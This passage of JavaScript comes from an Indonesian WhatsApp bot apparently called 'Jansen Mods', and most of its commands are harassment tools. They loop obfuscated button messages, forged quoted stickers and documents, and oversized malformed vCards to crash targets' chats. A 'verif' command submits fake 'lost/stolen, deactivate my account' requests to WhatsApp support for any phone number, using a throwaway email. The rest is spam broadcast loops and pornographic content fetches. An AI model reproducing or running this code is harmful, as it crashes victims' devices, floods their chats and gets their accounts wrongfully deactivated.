case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'jansennih': case 'crashar18': case 'mexdemam': case 'jansen1': case 'jansen2': case 'jansen3': case 'jansen4': case 'jansen5': case 'jansen6': case 'jansen7': case 'jansen8': case 'jansen9': case 'jansen10': case 'jansen11': case 'jansen12': case 'jansen13': case 'jansen14': case 'jansen15': case 'jansen16': case 'jansen17': case 'jansen18': case 'jansen19': case 'jansen20': case 'jansen21': case 'jansen22': case 'jansen23': case 'jansen24': case 'jansen25': case 'jansen26': case 'jansen27': case 'jansen28':
case 'jansen29':
case 'jansen30':
case 'jansen31':
case 'jansen32':
case 'jansen33':
case 'jansen34':
case 'jansen35':
case 'jansen36':
case 'jansen37':
case 'jansen38':
case 'jansen39':
case 'jansen40':
case 'jansen41':
case 'jansen42':
case 'jansen43':
case 'jansen44':
case 'jansen45':
case 'jansen46':
case 'jansen47':
case 'jansen48':
case 'jansen49':
case 'jansen50':
case 'jansen51':
case 'jansen52':
case 'jansen53':
case 'jansen54':
case 'jansen55':
case 'jansen56':
case 'jansen57':
case 'jansen58':
case 'jansen59':
case 'jansen60':
case '👽': case '☠️': case '️👾': case '🪐': case '🦴': case '☝': case '👻': case '🦖': case '🦕': case '👿': case '🐉': case '⚡': case '💥': case '🔥': case '🌪️': case '🍂': case '🍃': case '🌴': case '🌿': case '🍀': case '🪵': case '🦥': case '🌳': case '🍁': case '🎋': 
case '🦂':
case '🐍':
case '🍓':
case '🍒': 
case '🍎': 
case '🍉': 
case '🍑': 
case '🍊':
case '🥭':
case '🍍': 
case '🍌':
case '🍋':
case '🍈':
case '🍏':
case '🍐':
case '🥝':
case '🫒':
case '🫐':
case '🍇':
case '🥥':
case '🍅':
case '🌶️':
case '🥕':
case '🍠':
case '🧅':
case '🌽':
case '🥦':
case '🥒':
case '🥬':
case '🫑':
case '🥑':
case '💀':
case '🍆':
case '🧄':
case '🥔':
case '🌰':
case '🥜':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281364399250','771192XPifQJ','6281364399250','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await jansen[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20JANSEN\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'JANSEN\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case prefix+"verif": {
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
jansen.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: m })
}
break
//=================================================//
case 'afk': {
if (isBan) throw sticBanLu(from)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Jansen Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'jansenstik': case 'jansenkangbug': case 'buttonkematian': case 'crashar19': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"height": 1288,
"width": 1288,
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm': case 'bugtiktok':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
m.reply(mess.wait)
jansen.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
break
//=================================================//
case 'jansenbugie': case 'jansenkangbug1': case 'crashar20': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./basejansen/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `GITHUB`,
url: 'https://youtube.com/@jansenmods'
}
},
{
quickReplyButton: {
displayText: 'MENU',
id: 'menu'
}
}]
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
jansen.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
jansen.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
jansen.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
jansen.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break
//=================================================//
case 'bugbctext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} jansenmods`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${jansen.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
jansen.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
case 'jansenbutton': case 'jansenkangbuttton': case 'testbutton': case 'inibutton': 
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
jansen.sendMessage(m.chat, buttonMessage)
}
 break
//=================================================//
case 'jansentag': case 'jansenbar':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
jansen.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
//=================================================//
case 'hiya': case 'jansenoke': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync('./basejansen/sound/ngeselin.BIN')
jansen.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}.BIN`, title: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'jansentod': case 'jansenewe': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
jansen.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
jansen.sendMessage(m.chat, { image: anu, caption: `${buttonkal}` }, { quoted: m})
}
}
break
//=================================================//
case 'jansenbokep': case 'jansenngentod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
jansen.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted: doc })
}
}
break
//=================================================//
case 'jansensange': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await jansen.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
jansen.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./basejansen/video/jansen.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
jansen.sendMessage(m.chat, anuala, `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${buttonkal}`,
} 
jansen.sendMessage(m.chat, bugcrot, { quoted: m }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (isBan) throw sticBanLu(from)

if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${buttonkal}`,
} 
jansen.sendMessage(m.chat, bugahay, { quoted: m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./basejansen/lib/converter')
let audio = await toAudio(media, 'mp4')
